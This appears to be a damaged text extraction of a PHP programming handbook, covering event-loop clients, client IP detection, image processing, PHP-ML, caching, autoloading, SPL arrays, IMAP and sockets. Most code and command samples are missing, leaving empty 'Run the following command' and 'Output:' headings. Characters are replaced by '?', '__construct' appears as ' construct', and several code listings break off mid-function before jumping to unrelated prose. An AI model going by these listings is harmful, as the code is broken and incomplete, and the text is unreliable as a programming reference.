<?php
class Scanner {
protected $port; // port path, e.g. /dev/pts/5 protected $fd; // numeric file descriptor protected $base; // EventBase
protected $dio; // dio resource protected $e_open; // Event protected $e_read; // Event

public function  construct ($port) {
$this->port = $port;
$this->base = new EventBase();
}

public function  destruct() {
$this->base->exit();

if ($this->e_open)
  $this->e_open->free(); if ($this->e_read)
  $this->e_read->free(); if ($this->dio)
dio_close($this->dio);
}

public function run() {
$stream = fopen($this->port, 'rb'); stream_set_blocking($stream, false);

$this->fd = EventUtil::getSocketFd($stream); if ($this->fd < 0) {
fprintf(STDERR, "Failed attach to port, events: %d\n", $events); return;
}

$this->e_open = new Event($this->base, $this->fd, Event::WRITE, [$this, '_onOpen']);
$this->e_open->add();
$this->base->dispatch();

fclose($stream);
}

public function _onOpen($fd, $events) {
$this->e_open->del();

$this->dio = dio_fdopen($this->fd);
// Call other dio functions here, e.g.
dio_tcsetattr($this->dio, [ 'baud' => 9600,
'bits' => 8,
'stop' => 1,
'parity' => 0
]);

$this->e_read = new Event($this->base, $this->fd, Event::READ | Event::PERSIST, [$this, '_onRead']);
$this->e_read->add();
}

public function _onRead($fd, $events) { while ($data = dio_read($this->dio, 1)) {
var_dump($data);



Testing

Run the following command in terminal A:


The output may be di?erent. Use the PTYs from the ?rst couple of rows (/dev/pts/5 and /dev/pts/8, in particular). In terminal B run the above-mentioned script. You may need root privileges:


In terminal C send a string to the ?rst PTY:


Output:


Section 70.5: HTTP Client Based on Event Extension
This is a sample HTTP client class based on Event extension.

The class allows to schedule a number of HTTP requests, then run them asynchronously.

http-client.php

* Dispatches all pending requests (events)
*
* @return void
*/
public function run() {
$this->base->dispatch();
}

public function  destruct() {
// Destroy connection objects explicitly, don't wait for GC.
// Otherwise, EventBase may be free'd earlier.
$this->connections = null;
}

/**
* @brief Adds a pending HTTP request
* 
* @param string $address Hostname, or IP
* @param int $port Port number
* @param array $headers Extra HTTP headers
* @param int $cmd A EventHttpRequest::CMD_* constant
* @param string $resource HTTP request resource, e.g. '/page?a=b&c=d'
* 
* @return EventHttpRequest|false
*/
public function addRequest($address, $port, array $headers,
$cmd = EventHttpRequest::CMD_GET, $resource = '/')
{
$conn = new EventHttpConnection($this->base, null, $address, $port);
$conn->setTimeout(5);
$req = new EventHttpRequest([$this, '_requestHandler'], $this->base); foreach ($headers as $k => $v) {
$req->addHeader($k, $v, EventHttpRequest::OUTPUT_HEADER);
}
$req->addHeader('Host', $address, EventHttpRequest::OUTPUT_HEADER);
$req->addHeader('Connection', 'close', EventHttpRequest::OUTPUT_HEADER); if ($conn->makeRequest($req, $cmd, $resource)) {
$this->connections []= $conn; return $req;
}

return false;
}


/**
* @brief Handles an HTTP request
* 
* @param EventHttpRequest $req
* @param mixed $unused
* 
* @return void
*/
public function _requestHandler($req, $unused) { if (is_null($req)) {
echo "Timed out\n";
} else {
$response_code = $req->getResponseCode(); if ($response_code == 0) {



test.php

This is a sample script on the server side.


Usage

Sample Output




(Trimmed.)

Note, the code is designed for long-term processing in the CLI SAPI.

Section 70.6: HTTP Client Based on Ev Extension
This is a sample HTTP client based on Ev extension.

Ev extension implements a simple yet powerful general purpose event loop. It doesn't provide network-speci?c watchers, but its I/O watcher can be used for asynchronous processing of sockets.
The following code shows how HTTP requests can be scheduled for parallel processing.

http-client.php
<?php
class MyHttpRequest {
/// @var MyHttpClient
private $http_client;
/// @var string
private $address;
/// @var string HTTP resource such as /page?get=param
private $resource;
/// @var string HTTP method such as GET, POST etc.
private $method;
/// @var int
private $service_port;
/// @var resource Socket
private $socket;
/// @var double Connection timeout in seconds.
private $timeout = 10.;
/// @var int Chunk size in bytes for socket_recv()
private $chunk_size = 20;
/// @var EvTimer
private $timeout_watcher;
/// @var EvIo
private $write_watcher;
/// @var EvIo
private $read_watcher;
/// @var EvTimer
private $conn_watcher;
/// @var string buffer for incoming data
private $buffer;
/// @var array errors reported by sockets extension in non-blocking mode.
private static $e_nonblocking = [ 11, // EAGAIN or EWOULDBLOCK
115, // EINPROGRESS
];

/**
* @param MyHttpClient $client
* @param string $host Hostname, e.g. google.co.uk
* @param string $resource HTTP resource, e.g. /page?a=b&c=d
* @param string $method HTTP method: GET, HEAD, POST, PUT etc.
* @throws RuntimeException
*/
public function  construct(MyHttpClient $client, $host, $resource, $method) {

$this->http_client = $client;
$this->host	= $host;
$this->resource	= $resource;
$this->method	= $method;

// Get the port for the WWW service
$this->service_port = getservbyname('www', 'tcp');

// Get the IP address for the target host
$this->address = gethostbyname($this->host);

// Create a TCP/IP socket
$this->socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP); if (!$this->socket) {
throw new RuntimeException("socket_create() failed: reason: " . socket_strerror(socket_last_error()));
}

// Set O_NONBLOCK flag
socket_set_nonblock($this->socket);

$this->conn_watcher = $this->http_client->getLoop()
->timer(0, 0., [$this, 'connect']);
}

public function  destruct() {
$this->close();
}

private function freeWatcher(&$w) { if ($w) {
$w->stop();
$w = null;
}
}

/**
* Deallocates all resources of the request
*/
private function close() { if ($this->socket) {
socket_close($this->socket);
$this->socket = null;
}

$this->freeWatcher($this->timeout_watcher);
$this->freeWatcher($this->read_watcher);
$this->freeWatcher($this->write_watcher);
$this->freeWatcher($this->conn_watcher);
}

/**
* Initializes a connection on socket
* @return bool
*/
public function connect() {
$loop = $this->http_client->getLoop();

$this->timeout_watcher = $loop->timer($this->timeout, 0., [$this, '_onTimeout']);
$this->write_watcher = $loop->io($this->socket, Ev::WRITE, [$this, '_onWritable']); return socket_connect($this->socket, $this->address, $this->service_port);

}

/**
* Callback for timeout (EvTimer) watcher
*/
public function _onTimeout(EvTimer $w) {
$w->stop();
$this->close();
}

/**
* Callback which is called when the socket becomes writable
*/
public function _onWritable(EvIo $w) {
$this->timeout_watcher->stop();
$w->stop();

$in = implode("\r\n", [
"{$this->method} {$this->resource} HTTP/1.1", "Host: {$this->host}",
'Connection: Close',
]) . "\r\n\r\n";

if (!socket_write($this->socket, $in, strlen($in))) { trigger_error("Failed writing $in to socket", E_USER_ERROR); return;
}

$loop = $this->http_client->getLoop();
$this->read_watcher = $loop->io($this->socket, Ev::READ, [$this, '_onReadable']);

// Continue running the loop
$loop->run();
}

/**
* Callback which is called when the socket becomes readable
*/
public function _onReadable(EvIo $w) {
// recv() 20 bytes in non-blocking mode
$ret = socket_recv($this->socket, $out, 20, MSG_DONTWAIT);

if ($ret) {
// Still have data to read. Append the read chunk to the buffer.
$this->buffer .= $out;
} elseif ($ret === 0) {
// All is read
printf("\n<<<<\n%s\n>>>>", rtrim($this->buffer)); fflush(STDOUT);
$w->stop();
$this->close(); return;
}

// Caught EINPROGRESS, EAGAIN, or EWOULDBLOCK
if (in_array(socket_last_error(), static::$e_nonblocking)) { return;
}

$w->stop();
$this->close();

}
}

/////////////////////////////////////
class MyHttpClient {
/// @var array Instances of MyHttpRequest
private $requests = [];
/// @var EvLoop
private $loop;

public function  construct() {
// Each HTTP client runs its own event loop
$this->loop = new EvLoop();
}

public function  destruct() {
$this->loop->stop();
}

/**
* @return EvLoop
*/
public function getLoop() { return $this->loop;
}

/**
* Adds a pending request
*/
public function addRequest(MyHttpRequest $r) {
$this->requests []= $r;
}

/**
* Dispatches all pending requests
*/
public function run() {
$this->loop->run();
}
}


/////////////////////////////////////
// Usage
$client = new MyHttpClient(); foreach (range(1, 10) as $i) {
$client->addRequest(new MyHttpRequest($client, 'my-host.local', '/test.php?a=' . $i, 'GET'));
}
$client->run();


Testing

Suppose http://my-host.local/test.php script is printing the dump of $_GET:


Then the output of php http-client.php command will be similar to the following:




(trimmed)

Note, in PHP 5 the sockets extension may log warnings for EINPROGRESS, EAGAIN, and EWOULDBLOCK errno values. It is possible to turn o? the logs with


Section 70.7: Using Amp event loop
Amp harnesses Promises [another name for Awaitables] and Generators for coroutine creation.




Chapter 71: How to Detect Client IP Address
Section 71.1: Proper use of HTTP_X_FORWARDED_FOR
In the light of the latest httpoxy vulnerabilities, there is another variable, that is widely misused.

HTTP_X_FORWARDED_FOR is often used to detect the client IP address, but without any additional checks, this can lead to security issues, especially when this IP is later used for authentication or in SQL queries without sanitization.

Most of the code samples available ignore the fact that HTTP_X_FORWARDED_FOR can actually be considered as information provided by the client itself and therefore is not a reliable source to detect clients IP address. Some of the samples do add a warning about the possible misuse, but still lack any additional check in the code itself.
So here is an example of function written in PHP, how to detect a client IP address, if you know that client may be behind a proxy and you know this proxy can be trusted. If you don't known any trusted proxies, you can just use REMOTE_ADDR

function get_client_ip()
{
// Nothing to do without any reliable information
if (!isset($_SERVER['REMOTE_ADDR'])) {
return NULL;
}

// Header that is used by the trusted proxy to refer to
// the original IP
$proxy_header = "HTTP_X_FORWARDED_FOR";

// List of all the proxies that are known to handle 'proxy_header'
// in known, safe manner
$trusted_proxies = array("2001:db8::1", "192.168.50.1"); if (in_array($_SERVER['REMOTE_ADDR'], $trusted_proxies)) {
// Get IP of the client behind trusted proxy
if (array_key_exists($proxy_header, $_SERVER)) {

// Header can contain multiple IP-s of proxies that are passed through.
// Only the IP added by the last proxy (last IP in the list) can be trusted.
$client_ip = trim(end(explode(",", $_SERVER[$proxy_header])));

// Validate just in case
if (filter_var($client_ip, FILTER_VALIDATE_IP)) { return $client_ip;
} else {
// Validation failed - beat the guy who configured the proxy or
// the guy who created the trusted proxy list?
// TODO: some error handling to notify about the need of punishment
}
}
}

// In all other cases, REMOTE_ADDR is the ONLY IP we can trust.
return $_SERVER['REMOTE_ADDR'];
}



Chapter 72: Create PDF ?les in PHP
Section 72.1: Getting Started with PDFlib
This code requires that you use the PDFlib library for it to function properly.

<?php
$pdf = pdf_new(); //initialize new object

pdf_begin_document($pdf); //create new blank PDF
pdf_set_info($pdf, "Author", "John Doe"); //Set info about your PDF
pdf_set_info($pdf, "Title", "HelloWorld");
pdf_begin_page($pdf, (72 * 8.5), (72 * 11)); //specify page width and height
$font = pdf_findfont($pdf, "Times-Roman", "host", 0) //load a font pdf_setfont($pdf, $font, 48); //set the font pdf_set_text_pos($pdf, 50, 700); //assign text position pdf_show($pdf, "Hello_World!"); //print text to assigned position
pdf_end_page($pdf); //end the page
pdf_end_document($pdf); //close the object

$document = pdf_get_buffer($pdf); //retrieve contents from buffer

$length = strlen($document); $filename = "HelloWorld.pdf"; //Finds PDF length and assigns file name

header("Content-Type:application/pdf"); header("Content-Length:" . $length);
header("Content-Disposition:inline; filename=" . $filename);

echo($document); //Send document to browser
unset($document); pdf_delete($pdf); //Clear Memory
?>

Chapter 73: YAML in PHP
Section 73.1: Installing YAML extension
YAML does not come with a standard PHP installation, instead it needs to be installed as a PECL extension. On linux/unix it can be installed with a simple


Note that libyaml-dev package must be installed on the system, as the PECL package is simply a wrapper around libYAML calls.

Installation on Windows machines is di?erent - you can either download a pre-compiled DLL or build from sources.

Section 73.2: Using YAML to store application con?guration
YAML provides a way to store structured data. The data can be a simple set of name-value pairs or a complex hierarchical data with values even being arrays.
Consider the following YAML ?le:


Let's say, it's saved as config.yaml. Then to read this ?le in PHP the following code can be used:


print_r will produce the following output:


Now con?g parameters can be used by simply using array elements:



Chapter 74: Image Processing with GD
Section 74.1: Image output
An image can be created using image* functions, where * is the ?le format. They have this syntax in common:

Saving to a ?le

If you want to save the image to a ?le, you can pass the ?lename, or an opened ?le stream, as $to. If you pass a stream, you don't need to close it, because GD will automatically close it.

For example, to save a PNG ?le:


When using fopen, make sure to use the b ?ag rather than the t ?ag, because the ?le is a binary output.

Do not try to pass fopen("php://temp", $f) or fopen("php://memory", $f) to it. Since the stream is closed by the function after the call, you will be unable to use it further, such as to retrieve its contents.

Output as an HTTP response

If you want to directly return this image as the response of the image (e.g. to create dynamic badges), you don't need to pass anything (or pass null) as the second argument. However, in the HTTP response, you need to specify your content type:


$mimeType is the MIME type of the format you are returning. Examples include image/png, image/gif and
image/jpeg.

Writing into a variable

There are two ways to write into a variable.

Using OB (Output Bu?ering)

Using stream wrappers

You may have many reasons that you don't want to use output bu?ering. For example, you may already have OB on. Therefore, an alternative is needed.
Using the stream_wrapper_register function, a new stream wrapper can be registered. Hence, you can pass a stream to the image output function, and retrieve it later.



In this example, the GlobalStream class writes any input into the reference variable (i.e. indirectly write to the global variable of the given name). The global variable can later be retrieved directly.

There are some special things to note:

A fully implemented stream wrapper class should look like this, but according to tests with the  call magic method, only stream_open, stream_write and stream_close are called from internal functions.
No ?ags are required in the fopen call, but you should at least pass an empty string. This is because the fopen function expects such parameter, and even if you don't use it in your stream_open implementation, a dummy one is still required.
According to tests, stream_write is called multiple times. Remember to use .= (concatenation assignment), not = (direct variable assignment).
Example usage

In the <img> HTML tag, an image can be directly provided rather than using an external link:


Section 74.2: Creating an image
To create a blank image, use the imagecreatetruecolor function:


$img is now a resource variable for an image resource with $widthx$height pixels. Note that width counts from left to right, and height counts from top to bottom.

Image resources can also be created from image creation functions, such as:

imagecreatefrompng imagecreatefromjpeg

other imagecreatefrom* functions.

Image resources may be freed later when there are no more references to them. However, to free the memory immediately (this may be important if you are processing many large images), using imagedestroy() on an image when it is no longer used might be a good practice.

Converting an image

Images created by image conversion does not modify the image until you output it. Therefore, an image converter can be as simple as three lines of code:


Section 74.3: Image Cropping and Resizing
If you have an image and want to create a new image, with new dimensions, you can use imagecopyresampled
function:

?rst create a new image with desired dimensions:


and store the original image into a variable. To do so, you may use one of the createimagefrom* functions where * stands for:

jpeg gif png string
For example:


Now, copy all (or part of) original image (src_img) into the new image (dst_img) by imagecopyresampled:


To set src_* and dst_* dimensions, use the below image:



Now, if you want to copy entire of source (initial) image, into entire of destination area (no cropping):


Chapter 75: Imagick
Section 75.1: First Steps
Installation

Using apt on Debian based systems


Using Homebrew on OSX/macOs


To see the dependencies installed using the brew method, visit brewformulas.org/Imagemagick.

Using binary releases

Instructions on imagemagick website.

Usage


Section 75.2: Convert Image into base64 String
This example is how to turn an image into a Base64 string (i.e. a string you can use directly in a src attribute of an
img tag). This example speci?cally uses the Imagick library (there are others available, such as GD as well).




Chapter 76: SOAP Server
Section 76.1: Basic SOAP Server


Chapter 77: Machine learning
Section 77.1: Classi?cation using PHP-ML
Classi?cation in Machine Learning is the problem that identi?es to which set of categories does a new observation belong. Classi?cation falls under the category of Supervised Machine Learning.

Any algorithm that implements classi?cation is known as classi?er


The classi?ers supported in PHP-ML are

SVC (Support Vector Classi?cation) k-Nearest Neighbors
Naive Bayes

The train and predict method are same for all classi?ers. The only di?erence would be in the underlying algorithm used.

SVC (Support Vector Classi?cation)

Before we can start with predicting a new observation, we need to train our classi?er. Consider the following code


The code is pretty straight forward. $cost used above is a measure of how much we want to avoid misclassifying each training example. For a smaller value of $cost you might get misclassi?ed examples. By default it is set to 1.0
Now that we have the classi?er trained we can start making some actual predictions. Consider the following codes that we have for predictions


The classi?er in the case above can take unclassi?ed samples and predicts there labels. predict method can take a single sample as well as an array of samples.

k-Nearest Neighbors

The class?er for this algorithm takes in two parameters and can be initialized like


$neighbor_num is the number of nearest neighbours to scan in knn algorithm while the second parameter is distance metric which by default in ?rst case would be Euclidean. More on Minkowski can be found here.
Following is a short example on how to use this classi?er

NaiveBayes Classi?er

NaiveBayes Classifier is based on Bayes' theorem and does not need any parameters in constructor. The following code demonstrates a simple prediction implementation


Practical case

Till now we only used arrays of integer in all our case but that is not the case in real life. Therefore let me try to describe a practical situation on how to use classi?ers.

Suppose you have an application that stores characteristics of ?owers in nature. For the sake of simplicity we can consider the color and length of petals. So there two characteristics would be used to train our data. color is the simpler one where you can assign an int value to each of them and for length, you can have a range like (0 mm,10 mm)=1 , (10 mm,20 mm)=2. With the initial data train your classi?er. Now one of your user needs identify the kind of ?ower that grows in his backyard. What he does is select the color of the ?ower and adds the length of the petals. You classi?er running can detect the type of ?ower ("Labels in example above")

Section 77.2: Regression
In classi?cation using PHP-ML we assigned labels to new observation. Regression is almost the same with di?erence being that the output value is not a class label but a continuous value. It is widely used for predictions and forecasting. PHP-ML supports the following regression algorithms

Support Vector Regression LeastSquares Linear Regression
Regression has the same train and predict methods as used in classi?cation.

Support Vector Regression

This is the regression version for SVM(Support Vector Machine).The ?rst step like in classi?cation is to train our model.


In regression $targets are not class labels as opposed to classi?cation. This is one of the di?erentiating factor for the two. After training our model with the data we can start with the actual predictions


Note that the predictions return a value outside the target.

LeastSquares Linear Regression

This algorithm uses least squares method to approximate solution. The following demonstrates a simple code of training and predicting


PHP-ML also provides with the option of Multiple Linear Regression. A sample code for the same can be as follows


Multiple Linear Regression is particularly useful when multiple factors or traits identify the outcome.

Practical case

Now let us take an application of regression in real life scenario.

Suppose you run a very popular website, but the tra?c keeps on changing. You want a solution that would predict the number of servers you need to deploy at any given instance of time. Lets assume for the sake that your hosting provider gives you an api to spawn out servers and each server takes 15 minutes to boot. Based on previous data of tra?c, and regression you can predict the tra?c that would hit your application at any instance of time. Using that knowledge you can start a server 15 minutes before the surge thereby preventing your application from going o?ine.

Section 77.3: Clustering
Clustering is about grouping similar objects together. It is widely used for pattern recognition. Clustering comes under unsupervised machine learning, therefore there is no training needed. PHP-ML has support for the following clustering algorithms

k-Means dbscan
k-Means

k-Means separates the data into n groups of equal variance. This means that we need to pass in a number n which would be the number of clusters we need in our solution. The following code will help bring more clarity


Note that the output contains 3 arrays because because that was the value of n in KMeans constructor. There can also be an optional second parameter in the constructor which would be the initialization method. For example consider


INIT_RANDOM places a completely random centroid while trying to determine the clusters. But just to avoid the centroid being too far away from the data, it is bound by the space boundaries of data.

The default constructor initialization method is kmeans++ which selects centroid in a smart way to speed up the process.

DBSCAN

As opposed to KMeans, DBSCAN is a density based clustering algorithm which means that we would not be passing n which would determine the number of clusters we want in our result. On the other hand this requires two parameters to work

1. $minSamples : The minimum number of objects that should be present in a cluster

2. $epsilon : Which is the maximum distance between two samples for them to be considered as in the same cluster.
A quick sample for the same is as follows


The code is pretty much self explanatory. One major di?erence is that there is no way of knowing the number of elements in output array as opposed to KMeans.
Practical Case

Let us now have a look on using clustering in real life scenario

Clustering is widely used in pattern recognition and data mining. Consider that you have a content publishing application. Now in order to retain your users they should look at content that they love. Let us assume for the sake of simplicity that if they are on a speci?c webpage for more that a minute and they scoll to bottom then they love that content. Now each of your content will be having a unique identi?er with it and so will the user. Make cluster based on that and you will get to know which segment of users have a similar content taste. This in turn could be used in recommendation system where you can assume that if some users of same cluster love the article then so will others and that can be shown as recommendations on your application.

Chapter 78: Cache
Section 78.1: Caching using memcache
Memcache is a distributed object caching system and uses key-value for storing small data. Before you start calling Memcache code into PHP, you need to make sure that it is installed. That can be done using class_exists method in php. Once it is validated that the module is installed, you start with connecting to memcache server instance.


This will validate that Memcache php-drivers are installed and connect to memcache server instance running on localhost.

Memcache runs as a daemon and is called memcached


In the example above we only connected to a single instance, but you can also connect to multiple servers using


Note that in this case unlike connect , there won't be any active connection until you try to store or fetch a value. In caching there are three important operations that needs to be implemented
1. Store data : Add new data to memcached server
2. Get data : Fetch data from memcached server
3. Delete data : Delete already existing data from memcached server

Store data

$cache or memcached class object has a set method that takes in a key,value and time to save the value for (ttl).


Here $ttl or time to live is time in seconds that you want memcache to store the pair on server.

Get data

$cache or memcached class object has a get method that takes in a key and returns the corresponding value.



In case there is no value set for the key it will return null

Delete data

Sometimes you might have the need to delete some cache value.$cache or memcache instance has a delete
method that can be used for the same.


Small scenario for caching

Let us assume a simple blog. It will be having multiple posts on landing page that get fetched from database with each page load. In order to reduce the sql queries we can use memcached to cache the posts. Here is a very small implementation


Section 78.2: Cache Using APC Cache
The Alternative PHP Cache (APC) is a free and open opcode cache for PHP. Its goal is to provide a free, open, and robust framework for caching and optimizing PHP intermediate code.
installation


Add Cache:


Delete Cache:


Set Cache Example:




Performance:

APC is nearly 5 times faster than Memcached.

Chapter 79: Autoloading Primer
Section 79.1: Autoloading as part of a framework solution


Thanks to our generic autoloader, we have access to any class that follows our autoloader naming convention. In this example, our convention is simple: the desired class must have a ?le in the same directory named for the class and ending in ".php". Notice that the class name exactly matches the ?le name.
Without autoloading, we would have to manually require base classes. If we built an entire zoo of animals, we'd have thousands of require statements that could more easily be replaced with a single autoloader.

In the ?nal analysis, PHP autoloading is a mechanism to help you write less mechanical code so you can focus on solving business problems. All you have to do is de?ne a strategy that maps class name to ?le name. You can roll your own autoloading strategy, as done here. Or, you can use any of the standard ones the PHP community has adopted: PSR-0 or PSR-4. Or, you can use composer to generically de?ne and manage these dependencies.
Section 79.2: Inline class de?nition, no loading required




PHP knows what Animal is before executing new Animal, because PHP reads source ?les top-to-bottom. But what if we wanted to create new Animals in many places, not just in the source ?le where it's de?ned? To do that, we need to load the class de?nition.
Section 79.3: Manual class loading with require


Here we have three ?les. One ?le ("Animal.php") de?nes the class. This ?le has no side e?ects besides de?ning the class and neatly keeps all the knowledge about an "Animal" in one place. It's easily version controlled. It's easily reused.
Two ?les consume the "Animal.php" ?le by manually require-ing the ?le. Again, PHP reads source ?les top-to- bottom, so the require goes and ?nds the "Animal.php" ?le and makes the Animal class de?nition available before calling new Animal.

Now imagine we had dozens or hundreds of cases where we wanted to perform new Animal. That would require (pun-intended) many, many require statements that are very tedious to code.

Section 79.4: Autoloading replaces manual class de?nition loading




Compare this to the other examples. Notice how require "Animal.php" was replaced with require "autoload.php". We're still including an external ?le at run-time, but rather than including a speci?c class de?nition we're including logic that can include any class. It's a level of indirection that eases our development. Instead of writing one require for every class we need, we write one require for all classes. We can replace N require with 1 require.
The magic happens with spl_autoload_register. This PHP function takes a closure and adds the closure to a queue of closures. When PHP encounters a class for which it has no de?nition, PHP hands the class name to each closure in the queue. If the class exists after calling a closure, PHP returns to its previous business. If the class fails to exist after trying the entire queue, PHP crashes with "Class 'Whatever' not found."
Section 79.5: Autoloading with Composer
Composer generates a vendor/autoload.php ?le.

You might simply include this ?le and you will get autoloading for free.

require  DIR  . '/vendor/autoload.php';

This makes working with third-party dependencies very easy.

You can also add your own code to the Autoloader by adding an autoload section to your composer.json.


In this section you de?ne the autoload mappings. In this example its a PSR-4 mapping of a namespace to a directory: the /src directory resides in your projects root folder, on the same level as the /vendor directory is. An example ?lename would be src/Foo.php containing an YourApplicationNamespace\Foo class.
Important: After adding new entries to the autoload section, you have to re-run the command dump-autoload to re-generate and update the vendor/autoload.php ?le with the new information.
In addition to PSR-4 autoloading, Composer also supports PSR-0, classmap and files autoloading. See the autoload reference for more information.

When you including the /vendor/autoload.php ?le it will return an instance of the Composer Autoloader. You might store the return value of the include call in a variable and add more namespaces. This can be useful for autoloading classes in a test suite, for example.


Chapter 80: SPL data structures
Section 80.1: SplFixedArray
Di?erence from PHP Array

PHP's default Array type is actually implemented as ordered hash maps, which allow us to create arrays that consist of key/value pairs where values can be of any type and keys can be either numbers or strings. This is not traditionally how arrays are created, however.


So as you can see from this illustration a normal PHP array can be viewed more like an an ordered set of key/value pairs, where each key can map to any value. Notice in this array we have keys that are both numbers and strings, as well as values of di?erent types and the key has no bearing on the order of the elements.




So the above code would give us exactly what we'd expect. 9 => foo 1 => 4.2 bar =>
Regular PHP arrays are also dynamically sized for us. They grow and shrink as we push and pop values to and from the array, automatically.
However, in a traditional array the size is ?xed and consists entirely of the same type of value. Also, rather than keys each value is access by its index, which can be deduced by its o?set in the array.


Since we would know the size of a given type and the ?xed size of the array an o?set is then the type size * n were n represents the value's position in the array. So in the example above $arr[0] gives us 1, the ?rst element in the array and $arr[1] gives us 2, and so on.

SplFixedArray, however, doesn't restrict the type of values. It only restricts the keys to number types. It's also of a ?xed size.
This makes SplFixedArrays more e?cient than normal PHP arrays in one particular way. They are more compact so they require less memory.
Instantiating the array

SplFixedArray is implemented as an object, but it can be accessed with the same familiar syntax that you access a normal PHP array since they implement the ArrayAccess interface. They also implement Countable and Iterator interfaces so they behave the same way you'd be used to arrays behaving in PHP (i.e. things like count($arr) and foreach($arr as $k => $v) work the same way for SplFixedArray as they do normal arrays in PHP.
The SplFixedArray constructor takes one argument, which is the size of the array.

$arr = new SplFixedArray(4);



This gives you what you would expect. 0 => foo 1 => bar 2 => baz 3 =>
This also works as expected.


Gives us... int(4)
Notice in SplFixedArray, unlike a normal PHP Array, the key does depict the order of the element in our array, because it is a true index and not just a map.
Resizing the array

Just keep in mind that because the array is of a ?xed size, count will always return the same value. So while
unset($arr[1]) will result in $arr[1] === null, count($arr) still remains 4. So to resize the array you will need to call on the setSize method.


Now we get...

int(3) 0 => foo 1 => 2 => baz Import to SplFixedArray & Export from SplFixedArray

You can also import/export a normal PHP Array into and out of an SplFixedArray with the fromArray and toArray
methods.

1 2 3 4 5

Going the other way.

$fixedArray = new SplFixedArray(5);


1 2 3 4 5

Chapter 81: IMAP
Section 81.1: Connecting to a mailbox
To do anything with an IMAP account you need to connect to it ?rst. To do this you need to specify some required parameters:
The server name or IP address of the mail server The port you wish to connect on
IMAP is 143 or 993 (secure)
POP is 110 or 995 (secure)
SMTP is 25 or 465 (secure)
      NNTP is 119 or 563 (secure) Connection ?ags (see below)
Flag	Description	Options	Default
imap,

/service=service Which service to use

/user=user	remote user name for login on the server
/authuser=user	remote authentication user; if speci?ed this is the user name whose password is used (e.g. administrator)
/anonymous	remote access as anonymous user

pop3, nntp, smtp

imap

/debug	record protocol telemetry in application's debug log	disabled
/secure	do not transmit a plaintext password over the network
/norsh	do not use rsh or ssh to establish a preauthenticated IMAP session
/ssl	use the Secure Socket Layer to encrypt the session
/validate-cert	certi?cates from TLS/SSL server	enabled

/novalidate-cert do not validate certi?cates from TLS/SSL server, needed if server uses self- signed certi?cates. USE WITH CAUTION
/tls	force use of start-TLS to encrypt the session, and reject connection to servers that do not support it
/notls	do not do start-TLS to encrypt the session, even with servers that support it
/readonly	request read-only mailbox open (IMAP only; ignored on NNTP, and an error with SMTP and POP3)

Your connection string will look something like this:

disabled




Please note that if any of the characters in your connection string is non-ASCII it must be encoded with utf7_encode($string).
To connect to the mailbox, we use the imap_open command which returns a resource value pointing to a stream:


Section 81.2: Install IMAP extension
To use the IMAP functions in PHP you'll need to install the IMAP extension:

Debian/Ubuntu with PHP5


Debian/Ubuntu with PHP7


YUM based distro


Mac OS X with php5.6


Section 81.3: List all folders in the mailbox
Once you've connected to your mailbox, you'll want to take a look inside. The ?rst useful command is imap_list. The ?rst parameter is the resource you acquired from imap_open, the second is your mailbox string and the third is a fuzzy search string (* is used to match any pattern).


The output should look similar to this




[0]
=>
{imap.example.com:993/imap/tls/secure}INBOX
[1]
=>
{imap.example.com:993/imap/tls/secure}INBOX.Sent
[2]
=>
{imap.example.com:993/imap/tls/secure}INBOX.Drafts
[3]
=>
{imap.example.com:993/imap/tls/secure}INBOX.Junk
[4]
=>
{imap.example.com:993/imap/tls/secure}INBOX.Trash

You can use the third parameter to ?lter these results like this:


And now the result only contains entries with .Sent in the name:


Note: Using * as a fuzzy search will return all matches recursively. If you use % it will return only matches in the current folder speci?ed.
Section 81.4: Finding messages in the mailbox
You can return a list of all the messages in a mailbox using imap_headers.


The result is an array of strings with the following pattern:


Here's a sample of what each line could look like:

Symbol	Flag	Meaning
A	Answered Message has been replied to
D	Deleted	Message is deleted (but not removed) F	Flagged	Message is ?agged/stared for attention N	New	Message is new and has not been seen R	Recent	Message is new and has been seen
U	Unread	Message has not been read
X	Draft	Message is a draft

Note that this call could take a fair amount of time to run and may return a very large list.

An alternative is to load individual messages as you need them. Your emails are each assigned an ID from 1 (the oldest) to the value of imap_num_msg($mailbox).
There are a number of functions to access an email directly, but the simplest way is to use imap_header which returns structured header information:


)
[fromaddress] => Some One <someone@example.com> [from] => Array
(
[0] => stdClass Object (
[personal] => Some One [mailbox] => someone [host] => example.com
)
)
[reply_toaddress] => Some One <someone@example.com> [reply_to] => Array
(
[0] => stdClass Object (
[personal] => Some One [mailbox] => someone [host] => example.com
)
)
[senderaddress] => Some One <someone@example.com> [sender] => Array
(
[0] => stdClass Object (
[personal] => Some One [mailbox] => someone [host] => example.com
)
)
[Recent] => [Unseen] =>
[Flagged] => [Answered] => [Deleted] => [Draft] => [Msgno] =>	1
[MailDate] => 19-Oct-2011 17:34:48 +0000
[Size] => 1728
[udate] => 1319038488
)

Chapter 82: HTTP Authentication
In this topic we gonna make a HTTP-Header authenticate script.

Section 82.1: Simple authenticate
PLEASE NOTE: ONLY PUT THIS CODE IN THE HEADER OF THE PAGE, OTHERWISE IT WILL NOT WORK!


Chapter 83: WebSockets
Usage of socket extension implements a low-level interface to the socket communication functions based on the popular BSD sockets, providing the possibility to act as a socket server as well as a client.
Section 83.1: Simple TCP/IP server
Minimal example based on PHP manual example found here: http://php.net/manual/en/sockets.examples.php

Create a websocket script that listens to Port 5000 Use putty, terminal to run telnet 127.0.0.1 5000 (localhost). This script replies with the message you sent (as a ping-back)

<?php
set_time_limit(0); // disable timeout
ob_implicit_flush(); // disable output caching

// Settings
$address = '127.0.0.1';
$port = 5000;


/*
function socket_create ( int $domain , int $type , int $protocol )
$domain can be AF_INET, AF_INET6 for IPV6 , AF_UNIX for Local communication protocol
$protocol can be SOL_TCP, SOL_UDP	(TCP/UDP) @returns true on success
*/

if (($socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) === false) { echo "Couldn't create socket".socket_strerror(socket_last_error())."\n";
}


/*
socket_bind ( resource $socket , string $address [, int $port = 0 ] ) Bind socket to listen to address and port
*/

if (socket_bind($socket, $address, $port) === false) {
echo "Bind Error ".socket_strerror(socket_last_error($sock)) ."\n";
}

if (socket_listen($socket, 5) === false) {
echo "Listen Failed ".socket_strerror(socket_last_error($socket)) . "\n";
}

do {
if (($msgsock = socket_accept($socket)) === false) {
echo "Error: socket_accept: " . socket_strerror(socket_last_error($socket)) . "\n"; break;
}

/* Send Welcome message. */
$msg = "\nPHP Websocket \n";

// Listen to user input
do {
if (false === ($buf = socket_read($msgsock, 2048, PHP_NORMAL_READ))) {
